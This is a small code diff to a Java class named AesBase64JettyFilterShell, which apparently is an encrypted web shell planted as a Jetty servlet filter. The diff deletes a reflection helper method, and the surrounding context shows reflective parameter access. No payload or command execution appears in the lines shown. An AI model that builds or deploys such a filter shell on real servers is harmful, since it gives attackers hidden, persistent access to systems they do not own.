@@ -311,19 +311,6 @@ public class AesBase64JettyFilterShell extends ClassLoader implements Invocation
         return field;
     }
 
-    private static Object getFieldValue(Object obj, String fieldName) throws Exception {
-        Field f = null;
-        if (obj instanceof Field) {
-            f = (Field) obj;
-        } else {
-            f = getField(obj, fieldName);
-        }
-        if (f != null) {
-            return f.get(obj);
-        }
-        return null;
-    }
-
     private String getParameter(Object requestObject, String name) {
         return (String) invokeMethod(requestObject, "getParameter", name);
     }
